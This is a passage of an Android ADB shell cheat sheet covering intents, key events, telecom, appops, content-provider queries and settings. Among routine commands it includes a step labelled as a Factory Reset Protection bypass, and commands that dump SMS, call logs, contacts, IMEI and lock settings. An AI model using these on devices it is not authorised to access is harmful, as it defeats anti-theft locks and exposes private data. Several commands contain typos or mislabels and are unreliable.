adb shell am start \
    -a android.intent.action.VIEW  \
    -d https://www.nr1.nu
```

#### Launch video player and play sound
```bash
 am start -a android.intent.action.VIEW \
    -d file:///sdcard/sound.ogg 
    -t audio/ogg
```

#### Launch video player and play a movie
```bash
am start -a android.intent.action.VIEW \
    -d file:///sdcard/video.mkv \
    -t video/mkv
```

#### Open Google Maps with fixed coordinates
```bash
adb shell am start -a android.intent.action.VIEW  \
    -d "geo:46.457398,-119.407305"
```

#### Simulate waking your app using the following commands
```bash
adb shell am set-inactive <packageName> 
adb shell am set-inactive <packageName> false
```

#### Enabling Night Mode (If Supported)
```bash
adb shell am start \
    --ez show_night_mode true  \
    com.android.systemui/.tuner.TunerActivity
```

#### Start facebook application inbox by using URI
```bash
adb shell am start \
    -a android.intent.action.VIEW  \
    -d facebook://facebook.com/inbox
```

#### Open a vcard file from sdcard (will open contacts app)
```bash
adb shell am start \
    -a android.intent.action.VIEW  \
    -d file:///sdcard/me.vcard \
    -t text/x-vcard
```

#### Open an application to get content
```bash
adb shell am start  \
    -a android.intent.action.GET_CONTENT \
    -t image/jpeg
```
#### There is several ways to send a SMS via AM, here is just one of several ways:
```bash
adb shell am broadcast  \
    -a com.whereismywifeserver.intent.TEST \
    --es sms_body "test from adb"
```

#### Simulate waking your app using the following commands:
```bash
adb shell am set-inactive <packageName> 
adb shell am set-inactive <packageName> false
```

#### Start facebook application inbox by using URI
```bash 
adb shell am start  \
    -a android.intent.action.VIEW  \
    -d facebook://facebook.com/inbox
```  
#### Open a vcard file from sdcard (will open contacts app)
```bash
adb shell am start  \
    -a android.intent.action.VIEW  \
    -d file:///sdcard/me.vcard  \
    -t text/x-vcard  
```

#### Open an application to get content (in this case to get a jpeg picture)
```bash
adb shell am start  \
    -a android.intent.action.GET_CONTENT  \
    -t image/jpeg
```

#### There is several ways to send a SMS via AM, here is one example:
```bash
adb shell am broadcast  \
    -a com.whereismywifeserver.intent.TEST  \
    --es sms_body "test from adb"
```

#### Open settings for a specifik app
```bash
adb shell am start  \
    -a android.settings.APPLICATION_DETAILS_SETTINGS package:<com.package.example>
```

## Android™ Input <small>keyevent</small>

#### Erase all text

```bash
adb shell input keyevent KEYCODE_MOVE_END
adb shell input keyevent \
    --longpress $(printf 'KEYCODE_DEL %.0s' {1..250})
```

#### Start Calculator via Keyevent
```bash
adb shell input keyevent KEYCODE_CALCULATOR
```
#### Start Calendar via Keyevent
```bash
adb shell input keyevent KEYCODE_CALENDAR
```
#### Start Call Application via Keyevent
```bash
adb shell input keyevent KEYCODE_CALL
```
#### Start Camera via Keyevent
```bash
adb shell input keyevent KEYCODE_CAMERA
```
#### Press Caps Lock via Keyevent
```bash
adb shell input keyevent KEYCODE_CAPS_LOCK
```
#### Start Captions via Keyevent
```bash
adb shell input keyevent KEYCODE_CAPTIONS
```
#### Open Contacts Application via Keyevent
```bash
adb shell input keyevent KEYCODE_CONTACTS
```
#### Copy via Keyevent
```bash
adb shell input keyevent KEYCODE_COPY
```
#### Cut via Keyevent
```bash
adb shell input keyevent KEYCODE_CUT
```
#### Delete via Keyevent
```bash
adb shell input keyevent KEYCODE_DEL
```
#### EndCall via Keyevent
```bash
adb shell input keyevent KEYCODE_ENDCALL
```
#### Press END via Keyevent
```bash
adb shell input keyevent KEYCODE_END
```

#### Jump to begin of line
```bash
adb shell input keyevent KEYCODE_DPAD_UP
```
#### Jump to end of line
```bash
adb shell input keyevent KEYCODE_DPAD_DOWN
```
#### Move cursor one step to left/righgt
```bash
adb shell input keyevent KEYCODE_DPAD_LEFT
```
```bash
adb shell input keyevent KEYCODE_DPAD_RIGFHT
```
#### Print -> `
```bash
adb shell input keyevent KEYCODE_GRAVE
```
#### Press Home Button
```bash
adb shell input keyevent KEYCODE_HOME
```
#### Press + and - button
```bash
adb shell input keyevent KEYCODE_MINUS
```
```bash
adb shell input keyevent KEYCODE_PLUS
```
#### Press + in numpad
```bash
adb shell input keyevent KEYCODE_NUMPAD_ADD
```
#### Press * button
```bash
adb shell input keyevent KEYCODE_NUMPAD_MULTIPLY
```
#### Press serach key
```bash
adb shell input keyevent KEYCODE_SEARCH
```
#### Open Settings
```bash
adb shell input keyevent KEYCODE_SETTINGS
```
#### Press # button
```bash
adb shell input keyevent KEYCODE_NUMPAD_MULTIPLY
```
#### Start default music app
```bash
adb shell input keyevent KEYCODE_POUND
```
#### Mute Volume
``` bash
adb shell input keyevent KEYCODE_MUTE
```
#### Open notification bar and close
```bash
adb shell input keyevent KEYCODE_NOTIFICATION
```
```bash
adb shell input keyevent KEYCODE_NOTIFICATION
```
#### Cancel long press
```bash
adb shell input keyevent FLAG_CANCELED_LONG_PRESS
```
#### Open App Switch for change application
```bash
adb shell input keyevent KEYCODE_APP_SWITCH
```
#### Open Default Assistant
```bash
adb shell input keyevent KEYCODE_BRIGHTNESS_DOWN
```
```bash
adb shell input keyevent KEYCODE_BRIGHTNESS_UP
```
#### Select
```bash
adb shell input keyevent KEYCODE_BUTTON_SELECT
```

#### Add a Contact, fill info and press save on device
```bash
adb shell am start -a android.intent.action.INSERT \
    -t vnd.android.cursor.dir/contact \
    -e name 'wuseman' \
    -e phone '+467777701'  \
    -e email 'wuseman@nr1.nu' \
    -e postal 'Street 10, New York'
```
#### For press save contact via shell from above command 

```bash
adb shell input keyevent 4
adb shell input keyevent 4 
```

```bash
adb shell am start -a android.intent.action.INSERT \
    -t vnd.android.cursor.dir/contact \
    -e name 'wuseman' \
    -e phone '+46728999329'  \
    -e email 'wuseman@nr1.nu' 
```

#### Open dialer

```bash
adb shell am start com.samsung.android.dialer/.DialtactsActivity
```
#### Launch Launcher Activitíes
```bash
adb shell am start com.sec.android.app.launcher/com.sec.android.app.launcher.activities.LauncherActivity
```
#### Launch homescreen at first screen
```bash
adb shell am start \
    com.sec.android.app.launcher/com.android.launcher3.uioverrides.QuickstepLauncher  

adb shell am start \
    com.sec.android.app.launcher/.activities.LauncherActivity
```
#### Launch all open apps in launcher
```bash
adb shell am start  \
    com.sec.android.app.launcher/com.sec.android.app.launcher.activities.LauncherActivity
```
## Launch messenger default settings
```bash
adb shell am start  \
    com.samsung.android.messaging/com.samsung.android.messaging.ui.view.setting.MainSettingActivity
```

#### Launch messenger converstation composer
```bash
adb shell am start  \
    com.samsung.android.messaging/com.android.mms.ui.ConversationComposer
```
#### Launch messenger select contact
```bash
adb shell am start  \
    com.samsung.android.messaging/com.samsung.android.messaging.ui.view.recipientspicker.PickerActivity
```
#### Launch messenger with latest contacted
```bash
adb shell am start  \
    com.samsung.android.dialer/com.samsung.android.dialer.calllog.view.picker.CallLogPickerActivity
```
#### Launch Samsung Gallery
```bash
adb shell am start  \
    com.sec.android.gallery3d/com.samsung.android.gallery.app.activity.GalleryActivity
```

#### Samsung Myfiles
```bash
adb shell am start  \
    com.sec.android.app.myfiles/com.sec.android.app.myfiles.external.ui.MainActivity
```

#### Launs Android Settings, connections
```bash
adb shell am start com.android.settings/com.android.settings.SubSettings
```
#### Open Projectmenu (Huawei only)
```bash
adb shell am start  \
    com.huawei.android.projectmenu/com.huawei.android.projectmenu.ProjectMenuActivity
```

#### Make Demo Call   

Establishes a fake Bluetooth connection to Dialer and 
must be called first to enable access to all call-related commands.

#### Connect to device 
```bash
adb shell am broadcast -a com.android.car.dialer.intent.action.adb --es "action" "connect" 
```

#### Place the outgoing call

```bash
 am broadcast \
    -a com.android.car.dialer.intent.action.adb \
    --es "action" "addCall" \
    --es "id" "4085524874"  
```

#### Receive the incoming call      

```bash
adb shell am broadcast  \
    -a com.android.car.dialer.intent.action.adb  \
    --es "action" "rcvCall" --es "id" "4085524874"        
```

#### End the current call

```bash
adb shell am broadcast  \
    -a com.android.car.dialer.intent.action.adb  \
    --es "action" "endCall"  \
    --es "id" "4085524874"        
```

#### Hold the current call 

```bash
adb shell am broadcast  \
    -a com.android.car.dialer.intent.action.adb  \
    --es "action" "holdCall"                     
```

#### Unhold the current call

```bash
adb shell am broadcast  \
    -a com.android.car.dialer.intent.action.adb  \
    --es "action" "unholdCall"                            
```

#### Merge calls

```bash
adb shell am broadcast  \
    -a com.android.car.dialer.intent.action.adb  \
    --es "action" "unholdCall"                            
```

#### Clear all calls, To remove all calls in the call list:

```bash
adb shell am broadcast  \
    -a com.android.car.dialer.intent.action.adb  \
    --es "action" "clearAll"                              
```

#### Press home button via intent and print status info

```bash
adb shell am start  \
    -W -c android.intent.category.HOME  \
    -a android.intent.action.MAIN
```

```
Starting: Intent { act=android.intent.action.MAIN 
    cat=[android.intent.category.HOME] }
Warning: Activity not started, intent has been 
delivered to currently running top-most instance.
Status: ok
LaunchState: UNKNOWN (0)
Activity: com.sec.android.app.launcher/com.android.launcher3.uioverrides.QuickstepLauncher
TotalTime: 0
WaitTime: 17
Complete
```

## ADB Shell <small>telecom</small>

### Get default application for system dialer
```bash
telecom get-system-dialer
telecom get-default-dialer
```
### Print how many sim card device can handle
```bash
telecom get-max-phones
```
### Set the override system dialer to the given component. To remove the override, send "default"
```bash
telecom set-system-dialer
```
### Get sim config
```bash
telecom get-sim-config
```
### Set phone accouint enable 
```bash
adb shell telecom set-phone-account-enabled <COMPONENT> <ID> <USER_SN>
```
### Set phone account disable
```bash
adb shell telecom set-phone-account-disabled <COMPONENT> <ID> <USER_SN>
```
### Register phone account
```bash
adb shell telecom register-phone-account <COMPONENT> <ID> <USER_SN> <LABEL>
```
### Register sim phone account
```bash
adb shell telecom register-sim-phone-account [-e] <COMPONENT> <ID> <USER_SN> <LABEL>: registers a PhoneAccount with CAPABILITY_SIM_SUBSCRIPTION and optionally CAPABILITY_PLACE_EMERGENCY_CALLS if "-e" is provided
```
### Set user select phone account
```bash
adb shell telecom set-user-selected-outgoing-phone-account [-e] <COMPONENT> <ID> <USER_SN>
```
### Set test call app
```bash
adb shell telecom set-test-call-redirection-app <PACKAGE>
```
### Test screening app
```bash
adb shell telecom set-test-call-screening-app <PACKAGE>
```
### Set phone acct suggestion component
```bash
adb shell telecom set-phone-acct-suggestion-component <COMPONENT>
```
### Remove call companion app
```bash
adb shell telecom add-or-remove-call-companion-app <PACKAGE> <1/0>
```
### Regiustert sime phone account
```bash
adb shell telecom register-sim-phone-account <COMPONENT> <ID> <USER_SN> <LABEL> <ADDRESS>
```
###  Unregister phone account
```bash
adb shell telecom unregister-phone-account <COMPONENT> <ID> <USER_SN>
```
###  Set call diagnostic service
```bash
adb shell telecom set-call-diagnostic-service <PACKAGE>
```
###  Wait on handlers call
```bash
adb shell telecom wait-on-handlers
```
###  Change sim slot on your device
```bash
adb shell telecom set-sim-count <COUNT>
```
###   Stop suppressing the blocked number provider after a call to emergency services.
```bash
adb shell telecom stop-block-suppression
```
### Clear any disconnected calls that have gotten wedged in Telecom.
```bash
adb shell telecom cleanup-stuck-calls: 
```
### Set emer phone account fitler
```bash
adb shell telecom set-emer-phone-account-filter <PACKAGE>
```
### Enables the given phone account, if it has already been registered with Telecom.
```bash
telecom set-phone-account-enabled: 
```
### Disables the given phone account, if it has already been registered with telecom.
```bash
telecom set-phone-account-disabled: 
```
### Overrides call diagnostic service
```bash
telecom set-call-diagnostic-service: 
```
### Sets the override default dialer to the given component; 
### this will override whatever the dialer role is set to.
```bash
telecom set-default-dialer: 
```
### Displays the current default dialer
```bash
telecom get-default-dialer
```
###  Wait until all handlers finish their work
```bash
telecom wait-on-handlers:
```
### Set num SIMs (2 for DSDS, 1 for single SIM. This may restart the device
```bash
telecom set-sim-count: 
```
### Get the mSIM config string. "DSDS" for DSDS mode, or "" for single SIM
```bash
telecom get-sim-config: 
```
### Get the max supported phones from the modem
```bash
telecom get-max-phones: 
```
### Sets a package name that will be used for test emergency calls. To clear, send an emp
```bash
telecom set-test-emergency-phone-account-package-filter <PACKAGE>: 
```

## ADB Shell <small>appopos</small>

#### Set Application Run In Background Behavior
```bash
cmd appops set <package_name> RUN_IN_BACKGROUND ignore
```

#### Set Any Application Run In Background Behavior
```bash
cmd appops set <package_name> RUN_ANY_IN_BACKGROUND ignore
```

#### Set Application To Launch in Foreground
```bash
cmd appops set <package_name> START_FOREGROUND ignore
```

#### Set Application Settings for Instant Launch In Foreground
```bash
cmd appops set <package_name> INSTANT_APP_START_FOREGROUND ignore
```

#### Set Application Perrmision for Cliboard
```bash
cmd appops set <packagename> READ_CLIPBOARD allow
```

## ADB Shell <small>clipboard</small>

#### Paste clipboard
```bash
adb shell input kjeyevent PASTE
```
#### Paste clipboard
```bash
adb shell input keyevent 279
```
#### Paste clipboard (OLD DEVICES ONLY)
```bash
service call clipboard 1 
```
#### Set Application With Read Permissions for Clipboard
```bash
adb cmd appops set com.bankid.bus READ_CLIPBOARD allow  
```
#### Add Text To Clipboard
```bash
am broadcast -a clipper.set -e text "text"
```

## ADB Shell <small>acpi</small>

#### Print Battery Percentage
```bash
adb shell acip
```
#### Show batteries
```bash
adb shell acip -b 
```
#### Show Cooling Device State
```bash
adb shell acip -c    
```
#### Show Temperatures
```bash
adb shell acip -t 
```
#### Just print everything from acpi
```bash
adb shell acip -V
```
## ADB Shell <small>dpm</small>

#### Enable Device Admin
```bash
adb shell dpm set-device-owner \
    com.package.name/.DeviceAdminReceiver
```
## ADB Shell <small>service</small>

#### StatusBar

#### Expand Status Bar
```bash
adb shell service call statusbar 1
```
#### Expand Status Bar <full>
```bash
adb shell service call statusbar 2
```
#### Collapse Status Bar
```bash
adb shell service call statusbar 2
```
#### IMEI Related

#### Slot 1

#### Print IMEI - Example 1
```bash
adb shell service call iphonesubinfo 1 \
    |cut -d "'" -f2 \
    |grep -Eo '[0-9]'\
    |xargs| sed 's/\ //g'  
```
#### Print IMEI - Example 2
```bash
adb shell service call iphonesubinfo 3 i32 1 \
|grep -oE '[0-9a-f]{8} ' \
    | while read hex; do 
         echo -ne "\u${hex:4:4}\u${hex:0:4}"; 
       done; 
         echo          
```
#### Print IMEI - Example 3
```bash
adb shell echo "[device.imei]: [$(service call iphonesubinfo 1 \
    | awk -F "'" '{print $2}' \
    | sed '1 d' \
    | tr -d '\n' \
    | tr -d '.' \
    | tr -d ' ')]"
```
#### Print IMEI - Example 4

```bash
adb shell service call iphonesubinfo 1 \
    |awk -F"'" 'NR>1 { gsub(/\./,"",$2); imei=imei $2 } END {print imei}' 
```
#### Print IMEI - Example 5 

```bash
adb shell service call iphonesubinfo 1 \
    |cut -c 52-66 \
    |tr -d '.[:space:]'"
```
#### Print IMEI - Example 6
     
```bash
adb shell service call iphonesubinfo 1 \
    |awk -F "'" '{print }' \
    |sed '1 d' \
    |tr -d '.' \
    |awk '{print}' ORS=
```

#### Slot 2

Some devices has 2 sim card slot, for print the second simcards imei use below:

* Print IMEI - Slot 2

```bash
adb shell service call iphonesubinfo 3 i32 2 \ 
    |grep -oE '[0-9a-f]{8} ' \
    |while read hex; do 
        echo -ne "\u${hex:4:4}\u${hex:0:4}"; 
    done; echo       
```    
## ADB Shell <small>settings</small>

#### List how many times we booted device:

```bash
adb shell settings list global \
    |grep "boot_count=" \
    |cut -d= -f2 \
    |head -n 1 \
    |xargs echo "Booted:" \
    |sed 's/$/ times/g'
```
#### Hide Status bar

```bash
adb shell settings put global policy_control immersive.status=*
```
#### Hide Navigation bar

```bash
adb shell settings put global policy_control immersive.navigation=*
```
#### Hide both status and navigation bars

```bash
adb shell settings put global policy_control immersive.full=*
```
#### Revert bars to stock configuration

```bash
adb shell settings put global policy_control null*
```
##### It is also possible to specify this behavior for a specific application. 

Examples to modify the behavior when Enterprise Browser is in the foreground: 

```bash
adb shell settings put global policy_control  \
    immersive.full=com.honeywell.enterprisebrowser
```
```bash
adb shell settings put global policy_control \
    immersive.navigation=com.honeywell.enterprisebrowser
```
```bash
adb shell settings put global policy_control \
    immersive.status=com.honeywell.enterprisebrowser
```
## ADB Shell <small>content</small>

### Find contents in sdk map and create samples for this cheatsheet
```bash
rg .|rg 'content://.*"' -o     \
    |cut -d '"' -f1     \
    |sed 's/^/adb shell content query --uri /g'     \
    |sed 'i### Print\'    
```


### Find contents in sdk map and create samples for this cheatsheet
```bash
adb shell "su -c content query --uri content://com.samsung.rcs.autoconfigurationprovider/root/* \
    |tr ' ' '\n'"
```

##### Print device number 
```bash
adb shell "su -c content query \
    --uri content://com.samsung.rcs.autoconfigurationprovider/root/application/1/im/fthttpcsuser"
```

### All available options for content with examples

#### Delete a certain setting 
```bash
adb shell content delete --uri content://settings/secure --where "name='new_setting'"
```

#### Insert a setting and value to foo
```bash
adb shellcontent insert \
    --uri content://settings/secure \
    --bind name:s:user_setup_complete \
    --bind value:s:1
```
### Change setting to another setting
```bash
adb shell content update --uri content://settings/secure --bind value:s:newer_value --where "name='new_setting'
```
### Select "name" and "value" columns from secure settings where "name" is equal to "new_setting" and sort the result by name in ascending order.
```bash
adb shell content query --uri content://settings/secure --projection name:value --where "name='new_setting'" --sort "name ASC"
```
### Read will be able to read all kind of file extensions like zip, mp3, ogg 
### and you can redirect file with > foo.ogg, example:

#### Copy ringtones cache to foo.ogg
```bash
adb shell 'content read --uri content://settings/system/ringtone_cache' > foo.ogg
```
#### Set ringtone to foo.ogg
```bash
adb shell 'content write --uri content://settings/system/ringtone_cache' < host.ogg
```

### Print current type for a content, example:
```bash
adb shell content gettype --uri content://media/internal/audio/media/
Result: vnd.android.cursor.dir/audio
```
### Projection is the value in a query, example 

```
Row: 0 _id=5385, name=Tele2 Services, numeric=24007, mcc=240, mnc=07, carrier_id=-1, 
apn=internet.tele2.se, user=, server=, password=, proxy=, port=, mmsproxy=mmsproxy.tele2.se,
```

### Below will print all nbames and mmsproxy

```bash
adb shell su -c content query --uri content://telephony/carriers/sim_apn_list --projection name:mmsproxy
Row: 0 name=Tele2 Services, mmsproxy=mmsproxy.tele2.se
Row: 1 name=Tele2 IMS, mmsproxy=
Row: 2 name=Tele2 Services, mmsproxy=mmsproxy.tele2.se
Row: 3 name=Tele2 IMS, mmsproxy=
```

### Print heapdump
```bash
adb shell content query --uri content://com.android.shell.heapdump/
```
### Print calls
```bash
adb shell content query --uri content://call_log/calls
```
### Print shadow calls
```bash
adb shell content query --uri content://call_log_shadow/calls
```
### Print call filters
```bash
adb shell content query --uri content://call_log/calls/filter
```
### Print call log
```bash
adb shell content query --uri content://call_log/calls
```
### Print downloads
```bash
adb shell content query --uri content://downloads/my_downloads
```
### Print all downloads
```bash
adb shell content query --uri content://downloads/all_downloads
```
### Print current downloads
```bash
adb shell content query --uri content://downloads/
```
### Print my all live
```bash
adb shell content query --uri content://my.app/live
```
### Print sms changes
```bash
adb shell content query --uri content://sms-changes
```
### Print sms 
```bash
adb shell content query --uri content://sms
```
### Print sms inbox
```bash
adb shell content query --uri content://sms/inbox
```
### Print sms sent
```bash
adb shell content query --uri content://sms/sent
```
### Print sms draft messages
```bash
adb shell content query --uri content://sms/draft
```
### Print sms outbox
```bash
adb shell content query --uri content://sms/outbox
```
### Print sms convertations
```bash
adb shell content query --uri content://sms/conversations
```
### Print carrier information
```bash
adb shell content query --uri content://carrier_information/carrier
```
### Print mms ids
```bash
adb shell content query --uri content://mms-sms/threadID
```
### Print mms
```bash
adb shell content query --uri content://mms
```
### Print mms inbox 
```bash
adb shell content query --uri content://mms/inbox
```
### Print sent mms
```bash
adb shell content query --uri content://mms/sent
```
### Print mms drafts
```bash
adb shell content query --uri content://mms/drafts
```
### Print mms outbox
```bash
adb shell content query --uri content://mms/outbox
```
### Print mms via sms
```bash
adb shell content query --uri content://mms-sms/
```
### Print mms via sms convertation
```bash
adb shell content query --uri content://mms-sms/conversations
```
### Print mms via sms byphone
```bash
adb shell content query --uri content://mms-sms/messages/byphone
```
### Print  undelivered mms via sms 
```bash
adb shell content query --uri content://mms-sms/undelivered
```
### Print drafted mms via sms 
```bash
adb shell content query --uri content://mms-sms/draft
```
### Print locked mms via sms 
```bash
adb shell content query --uri content://mms-sms/locked
```
### Priint serach results for mms via sms 
```bash
adb shell content query --uri content://mms-sms/search
```

### Print device carriers
```bash
adb shell su -c content query --uri content://telephony/carriers
```
### Print device carriers apn list for simcard
```bash
adb shell su -c content query \
    --uri content://telephony/carriers/sim_apn_list \
    --projection name:mmsproxy
```
### Print  device carriers dpc 
```bash
adb shell content query --uri content://telephony/carriers/dpc
```
### Print device carriers filtered
```bash
adb shell content query --uri content://telephony/carriers/filtered
```
### Print device carriers enforce manage
```bash
adb shell content query --uri content://telephony/carriers/enforce_managed
```
### Print device preferapnset subids
```bash
adb shell content query --uri content://telephony/carriers/preferapn/subId
```
### Print  device preferapnset subid
```bash
adb shell content query --uri content://telephony/carriers/preferapnset/subId
```
### Print cellbroadcastas
```bash
adb shell content query --uri content://cellbroadcasts
```
### Print cellbroadcasts history
```bash
adb shell content query --uri content://cellbroadcasts/history
```
### Print cellbroadcasts öegacy
```bash
adb shell content query --uri content://cellbroadcast-legacy
```
### Print cellbroadcasts service state
```bash
adb shell content query --uri content://service-state/
```
### Print cellbroadcasts carrier-id
```bash
adb shell content query --uri content://carrier_id
```
### Print cellbroadcasts all info about carrier-id
```bash
adb shell content query --uri content://carrier_id/all
```
### Print cellbroadcasts simcard info
```bash
adb shell content query --uri content://telephony/siminfo
```

### Print all contact settings available
```bash
adb shell content query --uri content://contacts/settings
```

#### Contact list
```bash
adb shell content query --uri content://contacts/people
```
#### Print contacts by filter
```bash
adb shell content query --uri content://contacts/people/filter
```
#### Print deleted contacts
```bash
adb shell content query --uri content://contacts/deleted_people
```
#### Print contacts that has an email of im id added
```bash
adb shell content query --uri content://contacts/people/with_email_or_im_filter
```
#### Print contact group
```bash
adb shell content query --uri content://contacts/groups
```
#### Print deleted contact groups
```bash
adb shell content query --uri content://contacts/deleted_groups
```
#### Print all phone numbers
```bash
adb shell content query --uri content://contacts/phones
```
#### Print all phone number filters
```bash
adb shell content query --uri content://contacts/phones/filter
```
#### Print all groupmemberships
```bash
adb shell content query --uri content://contacts/groupmembership
```
#### Print all contacts groupmemberships in raw format
```bash
adb shell content query --uri content://contacts/groupmembershipraw
```
#### Print contact methods
```bash
adb shell content query --uri content://contacts/contact_methods
```
#### Print contacts email address
```bash
adb shell content query --uri content://contacts/contact_methods/email
```
#### Print contacxts presence
```bash
adb shell content query --uri content://contacts/presence
```
#### Print contacts organizations
```bash
adb shell content query --uri content://contacts/organizations
```
#### Print contacts photo path
```bash
adb shell content query --uri content://contacts/photos
```
#### Print fcontacts extensions
```bash
adb shell content query --uri content://contacts/extensions
```

### Get google contacts with full info
```bash
adb shell content query \
    --uri content://com.android.contacts/data \
    --projection display_name:data1:data4:contact_id
```
#### Get google contacts and print notes for every contact
```bash
adb shell content query \
    --uri content://contacts/phones/  \
    --projection display_name:number:notes
```

```bash
adb shell content query \
    --uri content://contacts/people/
```
#### Count people in contact list

```bash
adb shell bash content query \
    --uri content://contacts/people/ \
    |wc -l
```
### List the phone numbers
```bash
adb shell content query \
    --uri content://contacts/phones/
```

#### List the groups
```bash
adb shell content query \
    --uri content://contacts/groups/
```
#### List group membership
```bash
adb shell content query \
    --uri content://contacts/groupmembership/
```
#### List organizations
```bash
adb shell content query \
    --uri content://contacts/organizations/
```
#### Trick device that setup already has been done (FRP Bypassing)

```bash
adb shellcontent insert \
    --uri content://settings/secure \
    --bind name:s:user_setup_complete \
    --bind value:s:1
```
                                                                                   
```bash
adb shell am start \
    -n com.google.android.gsf.login/
```
```bash
adb shell am start \
    -n com.google.android.gsf.login.LoginActivity
```

#### Global/Settings/Secure

```bash
adb shell content query \
    --uri content://settings/global

adb shell content query \
    --uri content://settings/settings

adb shell content query \
    --uri content://settings/seure
```
#### Print files for all applications
```bash
adb shell content query  \
    --uri content://media/external/file  \
    --projection _data
```
#### Query secure settings 

Select "name" and `value` columns from secure settings where 
`name` is equal to `new_setting` and sort the result by name in ascending order

```bash
adb shell content query  \
    --uri content://settings/secure  \
    --projection name:value
```
#### Remove "new_setting" secure setting.
```bash
adb shell content delete  \
    --uri content://settings/secure \
    --where "name='new_setting'"
```
#### Download current ringtone and play on PC via ffplay: 

```bash
content read  \
    --uri content://settings/system/ringtone_cache' > a.ogg  \
    |xargs ffplay a.ogg
```

#### Auto rotation on
```bash
adb shell content insert \
    --uri content://settings/system \
    --bind name:s:accelerometer_rotation \
    --bind value:i:1
```

#### Auto rotation off
    ```bash
adb shell content insert \
    --uri content://settings/system \
    --bind name:s:accelerometer_rotation \
    --bind value:i:0
```
#### Rotate to landscape
```bash
adb shell content insert \
    --uri content://settings/system \  
    --bind name:s:user_rotation \
    --bind value:i:1
```

#### Rotate portrait
```bash
adb shell content insert \
    --uri content://settings/system \
    --bind name:s:user_rotation \
    --bind value:i:0
```

## ADB Shell <small>input</small>

####  Swipe from top and down 
```bash
adb shell input swipe 0 0 0 1000
```
####  Swipe from bottom and up
```bash
adb shell input swipe 0 1000 0 0
adb shell input swipe 100 4000 200 400
```
#### Swipe slowwer up to top 
```bash
adb shell input swipe 500 1000 0 0
```
####  Pinch out slow
```bash
adb shell input swipe 100 100 20 20
```
####  Pinch out harder
```bash
adb shell input swipe 100 100 20 1000
```
#### Swipe your finger  up and move window down 
```bash
adb shell input swipe 100 1000 20 100
```


#### Simulate a swipe down for notification bar:
```bash
adb shell input swipe 0 0 0 300 
```
#### Swipe and unlock screen:
```bash
adb shell input swipe 300 1000 300 500 
```
## ADB Shell <small>wm</small>

#### Print Screen Resolution
```bash
adb shell wm size
```
#### Set Screen Size
```bash
adb shell  wm size WxH 
```
#### Set Overscan:
```bash
adb shell wm overscan 0,0,0,200
```

## ADB Shell <small>getprop</small>

It is not so much to describe here, get info via getprop command. 

* Example Usage

```bash
adb shell getprop \
    |grep "model \
    |version.sdk \
    |manufacturer \
    |hardware \
    |platform \
    |revision \
    |serialno \
    |product.name \
    |brand"
```

#### Print CPU abi
```bash
adb shell getprop ro.product.cpu.abi
```

#### Get info if OEM Unlock is Allowed

```
1 = Enabled
0 = Disabled
```

```sh
adb shell getprop sys.oem_unlock_allowed 
```

#### Is System boot completed
```bash
adb shell adb shell getprop sys.boot_completed
```

## ADB Shell <small>setprop</small>
     
#### Auto answer any call after 2 seconds:

    setprop persist.sys.tel.autoanswer.ms 2000

#### Turn off auto answer:
 
    setprop persist.sys.tel.autoanswer.ms 0

## ADB Shell <small>/sys</small>

#### Set Screen Brightness 

#### Set Brightness Off

- 0 is the same as 1

    echo 1 > /sys/class/backlight/panel/brightness        

#### Set to maximum

    echo 48600 > /sys/class/backlight/panel/brightness 

#### Set to max normal

    echo 255 > /sys/class/backlight/panel/brightness 

#### Try vibrator
 
    echo 200 > /sys/class/timed_Example Output/vibrator/enable

#### Print USB Mode (Charging only, MTP)

    cat /sys/devices/soc0/hw_platform'

## ADB Shell <small>sm</small>

#### Adopting USB-Drive
 
    sm set-force-adoptable true

## ADB Shell <small>keytool</small>

#### Genereate hash from keystore  -Typically used in Facebook
```sh
keytool -exportcert -alias your_alias -keystore debug.keystore \
    | openssl sha1 -binary \
    | openssl base64 
```

#### Typically used in Google Maps
```sh
keytool -list -v -keystore ~/.android/debug.keystore -alias your_alias           
```

## ADB Shell <small>monkey</small>

#### Test any app by pressing 10000 times at once, this will start your application and perform 10000 random events.# 

```sh
monkey -p com.example.myapp -v 10000 
```

```
com.google.android.youtube/.app.honeycomb.Shell$HomeActivity
com.google.android.googlequicksearchbox/.SearchActivity
com.google.android.apps.docs.editors.docs/com.google.android.apps.docs.app.NewMainProxyActivity
com.android.documentsui/.LauncherActivity
com.google.android.apps.docs.editors.sheets/com.google.android.apps.docs.app.NewMainProxyActivity
com.google.android.apps.docs.editors.slides/com.google.android.apps.docs.app.NewMainProxyActivity
com.android.vending/.AssetBrowserActivity
```

## ADB Shell <small>sqlite3</small>

#### All previous commands is stored in

```sh
/data/user_de/0/com.android.providers.telephony/Log/FileLog0.log          
```
```                                                                                                                                
06-06 18:17:04.084 TP/MSP(27290): u:content://mms-sms/selected-conversations?type=all&multipleThreadIds=0, caller:com.samsung.android.messaging
06-06 18:17:08.209 TP/MSP(27290): u:content://mms-sms/selected-conversations?type=all&multipleThreadIds=0, caller:com.samsung.android.messaging
06-07 10:32:17.684 TP/MSP(4617) : u:content://mms-sms/selected-conversations?type=all&multipleThreadIds=0, caller:com.samsung.android.messaging
06-20 16:22:00.555 TP/MSP(8855) : u:content://mms-sms/selected-conversations?type=all&multipleThreadIds=0, caller:com.samsung.android.messaging
07-04 11:39:09.070 TP/BinSms(27174): move() - delete duplicated sms : 0
07-04 11:39:09.103 TP/BinIm(27174): move() - delete duplicated im : 0
07-04 12:04:09.178 TP/BinIm(5264): move() - delete duplicated im : 0
07-04 12:38:35.577 TP/IP(20576) : u:content://im/chat/72, r:1, caller:com.samsung.android.messaging
07-04 13:46:43.746 TP/IP(29004) : u:content://im/chat/77, r:1, caller:com.samsung.android.messaging
07-04 13:57:14.609 TP/IP(29004) : u:content://im/chat/83, r:1, caller:com.samsung.android.messaging
08-16 07:20:44.451 TP/BnR(30184): FILE       all backup finished
08-17 07:56:18.262 TP/MSP(9363) : u:content://mms-sms/selected-conversations?type=all&multipleThreadIds=32&multipleThreadIds=24, r:30, caller:com.samsung.android.messaging
```


#### Carrier info
```bash
cat /data/user_de/0/com.android.providers.telephony/files/carrierconfig-com.android
```
#### Read Lock Settings: 
```sh
sqlite3 -line /data/user_de/0/com.android.providers.telephony/databases/telephony.db 'select * from locksettings;'
```
#### Read SIM Card info
```sh
sqlite3 -line /data/user_de/0/com.android.providers.telephony/databases/telephony.db 'select * from android_metadata'
```
```sh
sqlite3 -line /data/user_de/0/com.android.providers.telephony/databases/telephony.db 'select *  from carrier'
```
```sh
sqlite3 -line /data/user_de/0/com.android.providers.telephony/databases/telephony.db 'select *  from original'
```
```sh
sqlite3 -line /data/user_de/0/com.android.providers.telephony/databases/telephony.db 'select * * from siminfo'
